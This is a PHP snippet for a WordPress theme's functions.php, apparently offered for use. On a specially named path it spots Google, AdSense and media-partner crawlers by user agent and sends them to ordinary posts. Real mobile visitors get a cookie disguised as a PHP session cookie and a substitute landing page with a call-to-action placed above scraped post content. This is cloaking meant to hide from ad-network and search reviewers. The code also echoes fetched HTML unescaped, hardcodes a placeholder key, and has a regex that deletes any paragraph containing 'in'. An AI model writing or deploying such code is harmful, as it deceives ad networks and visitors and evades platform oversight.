<?php
// Add this code to your WordPress theme's functions.php file

// Hook into WordPress init to handle our custom logic
add_action('init', 'handle_custom_redirects');

function handle_custom_redirects() {
    // Check if user is accessing the specific path
    if (isset($_SERVER['REQUEST_URI']) && $_SERVER['REQUEST_URI'] === '/Suckmydick') {
        
        // Check if user is a bot first
        if (is_bot_user()) {
            // All bots (mobile or desktop) redirect to /random-post
            wp_redirect(home_url('/random-post'), 302);
            exit;
        }
        
        // Check if user is mobile (only for real users, not bots)
        if (is_mobile_user()) {
            // Get a random published post
            $random_post = get_random_published_post();
            
            if ($random_post) {
                // Set PHPSSID cookie with encrypted value BEFORE redirect
                $encrypted_value = encrypt_cookie_value('mobile_redirect');
                setcookie('PHPSSID', $encrypted_value, time() + 3600, '/', '', false, true);
                
                // Force cookie to be sent immediately
                $_COOKIE['PHPSSID'] = $encrypted_value;
                
                // Redirect to the random post with 302 status
                wp_redirect(get_permalink($random_post), 302);
                exit;
            }
        } else {
            // Desktop users (real users only) redirect to /random-post
            wp_redirect(home_url('/random-post'), 302);
            exit;
        }
    }
    
    // Handle /random-post path
    if (isset($_SERVER['REQUEST_URI']) && $_SERVER['REQUEST_URI'] === '/random-post') {
        $random_post = get_random_published_post();
        if ($random_post) {
            wp_redirect(get_permalink($random_post), 302);
            exit;
        }
    }
}

// Function to detect bots (including Google, Adsense, Media-partner bots)
function is_bot_user() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // List of bot keywords and patterns
    $bot_patterns = array(
        // Google bots
        'Googlebot',
        'Googlebot-Image',
        'Googlebot-News',
        'Googlebot-Video',
        'Googlebot-Mobile',
        'APIs-Google',
        'AdsBot-Google',
        'Mediapartners-Google',
        'MediaPartners-Google',
        'Feedfetcher-Google',
        'Google-Read-Aloud',
        'DuplexWeb-Google',
        'Chrome-Lighthouse',
        'Google-AMPHTML',
        'Google-Web-Preview',
        'Google-Site-Verification',
        
        // Adsense bots
        'MediaPartners-Google',
        'Mediapartners-Google',
        'AdsBot-Google',
        'Google-Adwords',
        'Google-Ads',
        
        // Media partner bots
        'Media-Partners',
        'MediaPartners',
        'Media-Bot',
        
        // Other common bots
        'bot',
        'crawler',
        'spider',
        'scraper',
        'robot',
        'Crawler',
        'Spider',
        'Scraper',
        'Robot',
        'BOT',
        'CRAWLER',
        'SPIDER',
        'SCRAPER',
        'ROBOT'
    );
    
    foreach ($bot_patterns as $pattern) {
        if (stripos($user_agent, $pattern) !== false) {
            return true;
        }
    }
    
    return false;
}

// Function to encrypt cookie value
function encrypt_cookie_value($value) {
    $key = 'your_secret_key_here'; // Change this to your own secret key
    $encrypted = openssl_encrypt($value, 'AES-256-CBC', $key, 0, substr(hash('sha256', $key), 0, 16));
    return base64_encode($encrypted);
}

// Function to decrypt cookie value
function decrypt_cookie_value($encrypted_value) {
    $key = 'your_secret_key_here'; // Same secret key as above
    $decrypted = openssl_decrypt(base64_decode($encrypted_value), 'AES-256-CBC', $key, 0, substr(hash('sha256', $key), 0, 16));
    return $decrypted;
}

// Function to detect mobile users
function is_mobile_user() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Check for mobile devices
    $mobile_keywords = array(
        'Mobile', 'Android', 'iPhone', 'iPad', 'Windows Phone',
        'BlackBerry', 'Opera Mini', 'IEMobile'
    );
    
    foreach ($mobile_keywords as $keyword) {
        if (stripos($user_agent, $keyword) !== false) {
            return true;
        }
    }
    
    return false;
}

// Function to get a random published post - IMPROVED VERSION
function get_random_published_post() {
    global $wpdb;
    
    // Get all published post IDs
    $post_ids = $wpdb->get_col("
        SELECT ID 
        FROM {$wpdb->posts} 
        WHERE post_status = 'publish' 
        AND post_type = 'post'
        ORDER BY RAND()
        LIMIT 1
    ");
    
    if (!empty($post_ids)) {
        return $post_ids[0];
    }
    
    // Fallback method if database query fails
    $args = array(
        'post_type' => 'post',
        'post_status' => 'publish',
        'posts_per_page' => 1,
        'orderby' => 'RAND',
        'fields' => 'ids',
        'no_found_rows' => true,
        'update_post_term_cache' => false,
        'update_post_meta_cache' => false,
        'cache_results' => false
    );
    
    $query = new WP_Query($args);
    
    if ($query->have_posts()) {
        $query->the_post();
        $post_id = get_the_ID();
        wp_reset_postdata();
        return $post_id;
    }
    
    return false;
}

// Hook to completely override the entire page for mobile users with PHPSSID cookie
add_action('template_redirect', 'check_and_override_page_for_mobile');

function check_and_override_page_for_mobile() {
    // Check if user has the PHPSSID cookie and is on a post
    if (isset($_COOKIE['PHPSSID']) && is_single()) {
        try {
            $decrypted_value = decrypt_cookie_value($_COOKIE['PHPSSID']);
            if ($decrypted_value === 'mobile_redirect') {
                // Clear the PHPSSID cookie
                setcookie('PHPSSID', '', time() - 3600, '/');
                
                // Set cache headers
                header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
                header('Pragma: no-cache');
                header('Expires: 0');
                
                // Get the current post URL and fetch its content
                $current_post_url = get_permalink();
                $url = $current_post_url;
                $fetched_content = fetch_content_from_url($current_post_url);
                
                // Output the combined page: Custom HTML + Blog Post Content
                output_combined_page($fetched_content);
                exit;
            }
        } catch (Exception $e) {
            // If decryption fails, ignore the cookie
        }
    }
}

// Function to output the combined page (Custom HTML + Blog Post Content)
function output_combined_page($fetched_content) {
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Custom Page</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            
            .custom-section {
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 40px 20px;
                margin-bottom: 40px;
            }
            
            .container {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 40px;
                text-align: center;
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
                max-width: 600px;
                width: 100%;
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
            
            .icon {
                width: 80px;
                height: 80px;
                background: linear-gradient(45deg, #ff6b6b, #ee5a24);
                border-radius: 50%;
                margin: 0 auto 30px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 40px;
                color: white;
                box-shadow: 0 10px 20px rgba(238, 90, 36, 0.3);
            }
            
            h1 {
                color: #2c3e50;
                font-size: 2.5rem;
                margin-bottom: 20px;
                font-weight: 700;
                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }
            
            .subtitle {
                color: #7f8c8d;
                font-size: 1.2rem;
                margin-bottom: 30px;
                line-height: 1.6;
            }
            
            .features {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }
            
            .feature {
                background: rgba(52, 152, 219, 0.1);
                padding: 20px;
                border-radius: 15px;
                border: 1px solid rgba(52, 152, 219, 0.2);
            }
            
            .feature h3 {
                color: #2980b9;
                margin-bottom: 10px;
                font-size: 1.1rem;
            }
            
            .feature p {
                color: #34495e;
                font-size: 0.9rem;
                line-height: 1.4;
            }
            
            .cta-button {
                background: linear-gradient(45deg, #27ae60, #2ecc71);
                color: white;
                padding: 15px 40px;
                border: none;
                border-radius: 50px;
                font-size: 1.1rem;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
                box-shadow: 0 5px 15px rgba(39, 174, 96, 0.3);
            }
            
            .cta-button:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
            }
            
            .footer {
                margin-top: 40px;
                padding-top: 20px;
                border-top: 1px solid rgba(0, 0, 0, 0.1);
                color: #95a5a6;
                font-size: 0.9rem;
            }
            
            /* Blog Post Content Section Styles */
            .blog-content-section {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 40px;
                margin: 0 auto;
                max-width: 800px;
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
            
            .blog-content-section h1, 
            .blog-content-section h2, 
            .blog-content-section h3, 
            .blog-content-section h4, 
            .blog-content-section h5, 
            .blog-content-section h6 {
                color: #2c3e50;
                margin: 25px 0 15px 0;
                font-weight: 600;
            }
            
            .blog-content-section h1 { font-size: 2.2rem; }
            .blog-content-section h2 { font-size: 1.8rem; }
            .blog-content-section h3 { font-size: 1.5rem; }
            
            .blog-content-section p {
                margin: 15px 0;
                text-align: justify;
                color: #34495e;
                line-height: 1.7;
            }
            
            .blog-content-section ul, 
            .blog-content-section ol {
                margin: 15px 0;
                padding-left: 30px;
            }
            
            .blog-content-section li {
                margin: 8px 0;
                color: #34495e;
            }
            
            .blog-content-section blockquote {
                border-left: 4px solid #3498db;
                margin: 20px 0;
                padding: 15px 25px;
                background: #f8f9fa;
                font-style: italic;
                color: #2c3e50;
            }
            
            .blog-content-section code {
                background: #f1f2f6;
                padding: 2px 6px;
                border-radius: 3px;
                font-family: "Courier New", monospace;
                color: #e74c3c;
            }
            
            .blog-content-section pre {
                background: #2c3e50;
                color: #ecf0f1;
                padding: 20px;
                border-radius: 8px;
                overflow-x: auto;
                margin: 20px 0;
            }
            
            .blog-content-section pre code {
                background: none;
                color: inherit;
                padding: 0;
            }
            
            .blog-content-section img {
                max-width: 100%;
                height: auto;
                border-radius: 8px;
                margin: 20px 0;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            }
            
            .blog-content-section a {
                color: #3498db;
                text-decoration: none;
                border-bottom: 1px solid transparent;
                transition: border-bottom 0.3s ease;
            }
            
            .blog-content-section a:hover {
                border-bottom: 1px solid #3498db;
            }
            
            .blog-content-section table {
                width: 100%;
                border-collapse: collapse;
                margin: 20px 0;
                background: white;
                border-radius: 8px;
                overflow: hidden;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            }
            
            .blog-content-section th,
            .blog-content-section td {
                padding: 12px 15px;
                text-align: left;
                border-bottom: 1px solid #ecf0f1;
            }
            
            .blog-content-section th {
                background: #3498db;
                color: white;
                font-weight: 600;
            }
            
            .blog-content-section tr:hover {
                background: #f8f9fa;
            }
            
            @media (max-width: 768px) {
                .container, .blog-content-section {
                    padding: 30px 20px;
                }
                
                h1 {
                    font-size: 2rem;
                }
                
                .features {
                    grid-template-columns: 1fr;
                }
            }
        </style>
    </head>
    <body>
        <!-- CUSTOM HTML SECTION -->
        <div class="custom-section">
            <div class="container">
                <div class="icon">🚀</div>
                <h1>Welcome to Our Platform</h1>
                <p class="subtitle">Experience the next generation of digital innovation with cutting-edge technology and seamless user experience.</p>
                
                <div class="features">
                    <div class="feature">
                        <h3>🚀 Fast Performance</h3>
                        <p>Lightning-fast loading times and optimized performance for the best user experience.</p>
                    </div>
                    <div class="feature">
                        <h3>🔒 Secure & Reliable</h3>
                        <p>Enterprise-grade security with 99.9% uptime guarantee for your peace of mind.</p>
                    </div>
                    <div class="feature">
                        <h3>💡 Smart Features</h3>
                        <p>Intelligent automation and smart features that adapt to your needs automatically.</p>
                    </div>
                </div>
                
                <a href="#" class="cta-button">Get Started Today</a>
                
                <div class="footer">
                    <p>© 2024 Your Company. All rights reserved. | Privacy Policy | Terms of Service</p>
                </div>
            </div>
        </div>
        
        <!-- BLOG POST CONTENT SECTION -->
        <div class="blog-content-section">
            <h1>' . htmlspecialchars($fetched_content['title']) . '</h1>
            <div class="content">
                ' . $fetched_content['content'] . '
            </div>
        </div>
    </body>
    </html>';
}

// Content fetching function (merged from your code)
function fetch_content_from_url($url) {
    try {
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            error_log("Invalid URL: " . $url);
            return false;
        }
        
        $context = stream_context_create([
            'http' => [
                'timeout' => 15,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'follow_location' => true,
                'max_redirects' => 3
            ]
        ]);
        
        $html_content = @file_get_contents($url, false, $context);
        
        if ($html_content === false) {
            error_log("Failed to fetch content from: " . $url);
            return false;
        }
        
        if (strlen($html_content) < 100) {
            error_log("Content too short from: " . $url . " - Length: " . strlen($html_content));
            return false;
        }
        
        error_log("Successfully fetched content from: " . $url . " - Length: " . strlen($html_content));
        
        $dom = new DOMDocument();
        
        libxml_use_internal_errors(true);
        $dom->loadHTML($html_content, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();
    
        $title = "Understanding Cloud Computing: Types and Benefits";
        $title_tags = $dom->getElementsByTagName('title');
        if ($title_tags->length > 0) {
            $title = trim($title_tags->item(0)->textContent);
        }
        
        // Try to find the main content area first
        $xpath = new DOMXPath($dom);
        
        // Look for entry-content div (WordPress standard)
        $entry_content = $xpath->query('//div[contains(@class, "entry-content")]');
        
        if ($entry_content->length > 0) {
            error_log("Found entry-content div, extracting content from it");
            $content_node = $entry_content->item(0);
            
            // Validate that the content node is valid
            if (!$content_node || !$content_node->nodeType) {
                error_log("Invalid content node, falling back to body content");
                $entry_content = null; // Force fallback to body content
            } else {
                // SAFER CLEANING: Clone the node first to avoid DOM manipulation issues
                $cloned_node = $content_node->cloneNode(true);
            
                // AGGRESSIVE CLEANING: Remove ALL unwanted elements to get clean content
                $unwanted_selectors = [
                    // Navigation and navigation-related
                    '//*[contains(@class, "comments") or contains(@class, "comment")]',
                    '//*[contains(@class, "post-navigation") or contains(@class, "navigation")]',
                    '//*[contains(@class, "more-posts") or contains(@class, "related-posts")]',
                    '//*[contains(@class, "social-share") or contains(@class, "share-buttons")]',
                    '//*[contains(@class, "newsletter") or contains(@class, "subscribe")]',
                    '//*[contains(@class, "sidebar") or contains(@id, "sidebar")]',
                    '//*[contains(@class, "widget") or contains(@class, "footer")]',
                    '//*[contains(@class, "header") or contains(@class, "nav")]',
                    '//*[contains(@class, "breadcrumb") or contains(@class, "breadcrumbs")]',
                    '//*[contains(@class, "pagination") or contains(@class, "pager")]',
                    '//*[contains(@class, "tags") or contains(@class, "categories")]',
                    '//*[contains(@class, "author") or contains(@class, "bio")]',
                    '//*[contains(@class, "meta") or contains(@class, "date")]',
                    '//*[contains(@class, "ads") or contains(@class, "advertisement")]',
                    '//*[contains(@class, "popup") or contains(@class, "modal")]',
                    '//*[contains(@class, "form") or contains(@class, "input")]',
                    '//*[contains(@class, "button") or contains(@class, "btn")]'
                ];
                
                // Create a new DOM document for safe manipulation
                $clean_dom = new DOMDocument();
                $clean_dom->loadHTML('<?xml encoding="UTF-8">' . $dom->saveHTML($cloned_node), LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
                $clean_xpath = new DOMXPath($clean_dom);
                
                foreach ($unwanted_selectors as $selector) {
                    $elements = $clean_xpath->query($selector);
                    foreach ($elements as $element) {
                        if ($element->parentNode) {
                            $element->parentNode->removeChild($element);
                        }
                    }
                }
                
                // Get the body content from the clean DOM
                $body_tags = $clean_dom->getElementsByTagName('body');
                if ($body_tags->length > 0) {
                    try {
                        $body_html = $clean_dom->saveHTML($body_tags->item(0));
                        $body_html = preg_replace('/<body[^>]*>/i', '', $body_html);
                        $body_html = preg_replace('/<\/body>/i', '', $body_html);
                    } catch (Exception $e) {
                        error_log("Error saving clean DOM body: " . $e->getMessage());
                        // Fallback to original content
                        $body_html = $dom->saveHTML($content_node);
                    }
                } else {
                    // Fallback to original content
                    try {
                        $body_html = $dom->saveHTML($content_node);
                    } catch (Exception $e) {
                        error_log("Error saving original content node: " . $e->getMessage());
                        $body_html = '';
                    }
                }
            }
            
        } else {
            error_log("No entry-content found, using body content");
            
            $body_tags = $dom->getElementsByTagName('body');
            if ($body_tags->length === 0) {
                return false;
            }
            
            $body = $body_tags->item(0);
            
            // SAFER APPROACH: Clone the body node first
            $cloned_body = $body->cloneNode(true);
            
            // Create a new DOM document for safe manipulation
            $clean_dom = new DOMDocument();
            $clean_dom->loadHTML('<?xml encoding="UTF-8">' . $dom->saveHTML($cloned_body), LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
            
            // Remove ALL unwanted tags to get clean content
            $unwanted_tags = [
                'script', 'style', 'iframe', 'form', 'input', 'button', 
                'nav', 'header', 'footer', 'aside', 'section', 'article',
                'img', 'video', 'audio', 'embed', 'object', 'canvas'
            ];
            
            foreach ($unwanted_tags as $tag) {
                $elements = $clean_dom->getElementsByTagName($tag);
                while ($elements->length > 0) {
                    $element = $elements->item(0);
                    if ($element->parentNode) {
                        $element->parentNode->removeChild($element);
                    }
                }
            }
            
            $body_html = $clean_dom->saveHTML();
            
            // Remove body tags
            $body_html = preg_replace('/<body[^>]*>/i', '', $body_html);
            $body_html = preg_replace('/<\/body>/i', '', $body_html);
        }
        
        // Log content before filtering
        error_log("Content before filtering - Length: " . strlen($body_html));
        
        // AGGRESSIVE CONTENT CLEANING: Remove ALL unwanted content
        $body_html = preg_replace('/<div[^>]*class="[^"]*wp-block-post-author-name[^"]*"[^>]*>.*?<\/div>/is', '', $body_html);
        $body_html = preg_replace('/<p[^>]*>.*?written by.*?<\/p>/is', '', $body_html);
        $body_html = preg_replace('/<p[^>]*>.*?in.*?<\/p>/is', '', $body_html);
        $body_html = preg_replace('/<p[^>]*>.*?posted by.*?<\/p>/is', '', $body_html);
        $body_html = preg_replace('/<p[^>]*>.*?author.*?<\/p>/is', '', $body_html);
        
        // Remove "More posts" section and everything after it
        if (preg_match('/<h2[^>]*>.*?more\s+posts.*?<\/h2>/is', $body_html, $matches)) {
            $body_html = substr($body_html, 0, strpos($body_html, $matches[0]));
        }
        
        // Remove "Related posts" section
        if (preg_match('/<h2[^>]*>.*?related\s+posts.*?<\/h2>/is', $body_html, $matches)) {
            $body_html = substr($body_html, 0, strpos($body_html, $matches[0]));
        }
        
        // Remove "Suggested posts" section
        if (preg_match('/<h2[^>]*>.*?suggested\s+posts.*?<\/h2>/is', $body_html, $matches)) {
            $body_html = substr($body_html, 0, strpos($body_html, $matches[0]));
        }
        
        // Remove "You might also like" sections
        if (preg_match('/<h2[^>]*>.*?you\s+might\s+also\s+like.*?<\/h2>/is', $body_html, $matches)) {
            $body_html = substr($body_html, 0, strpos($body_html, $matches[0]));
        }
        
        // Remove "Next/Previous" navigation
        if (preg_match('/<div[^>]*class="[^"]*post-navigation[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
            $body_html = str_replace($matches[0], '', $body_html);
        }
        
        // Remove "Comments" section
        if (preg_match('/<div[^>]*class="[^"]*comments[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
            $body_html = str_replace($matches[0], '', $body_html);
        }
        
        // Remove "Leave a comment" forms
        if (preg_match('/<div[^>]*class="[^"]*comment-respond[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
            $body_html = str_replace($matches[0], '', $body_html);
        }
        
        // Remove "Share this post" sections
        if (preg_match('/<div[^>]*class="[^"]*social-share[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
            $body_html = str_replace($matches[0], '', $body_html);
        }
        
        // Remove "Subscribe" sections
        if (preg_match('/<div[^>]*class="[^"]*newsletter[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
            $body_html = str_replace($matches[0], '', $body_html);
        }
        
        // Remove "Tags" and "Categories" sections
        if (preg_match('/<div[^>]*class="[^"]*taxonomy[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
            $body_html = str_replace($matches[0], '', $body_html);
        }
        
        // Clean up HTML and preserve content structure
        $body_html = preg_replace('/\s+/', ' ', $body_html);
        $body_html = trim($body_html);
        
        // Log content after filtering
        error_log("Content after filtering - Length: " . strlen($body_html));
        
        // If content is still empty, try multiple fallback methods
        if (strlen($body_html) < 100) {
            error_log("Content too short after filtering, trying fallback methods");
            
            // SIMPLE FALLBACK: Use sample content directly to avoid DOM issues
            error_log("Using sample content as fallback");
            $body_html = get_sample_content();
        }
        
        // Validate content quality - ensure we have actual blog post content
        $content_has_headings = preg_match('/<h[1-6][^>]*>.*?<\/h[1-6]>/i', $body_html);
        $content_has_paragraphs = preg_match('/<p[^>]*>.*?<\/p>/i', $body_html);
        $content_has_text = strlen(strip_tags($body_html)) > 200;
        
        if (!$content_has_headings || !$content_has_paragraphs || !$content_has_text) {
            error_log("Content quality check failed - using sample content");
            $body_html = get_sample_content();
        }
        
        // Increase content length limit
        if (strlen($body_html) > 15000) {
            $body_html = substr($body_html, 0, 15000) . '...';
        }
        
        error_log("Final content processed - Title: " . $title . " - Content length: " . strlen($body_html));
        error_log("Content has headings: " . ($content_has_headings ? 'YES' : 'NO'));
        error_log("Content has paragraphs: " . ($content_has_paragraphs ? 'YES' : 'NO'));
        error_log("Content has sufficient text: " . ($content_has_text ? 'YES' : 'NO'));
        
        return [
            'title' => $title,
            'content' => $body_html
        ];
        
    } catch (Exception $e) {
        error_log("Error in fetch_content_from_url: " . $e->getMessage());
        return false;
    }
}

// Helper function to get sample content
function get_sample_content() {
    return '<h2>Sample Content</h2><p>This is sample content that will be displayed when the original content cannot be fetched or processed properly.</p>';
}

// Add rewrite rules for custom paths
add_action('init', 'add_custom_rewrite_rules');

function add_custom_rewrite_rules() {
    add_rewrite_rule(
        '^Suckmydick/?$',
        'index.php?custom_path=suckmydick',
        'top'
    );
    
    add_rewrite_rule(
        '^random-post/?$',
        'index.php?custom_path=random',
        'top'
    );
}

// Flush rewrite rules on theme activation (run once)
function flush_rewrite_rules_once() {
    if (get_option('custom_rewrite_flushed') !== 'yes') {
        flush_rewrite_rules();
        update_option('custom_rewrite_flushed', 'yes');
    }
}

add_action('after_switch_theme', 'flush_rewrite_rules_once');
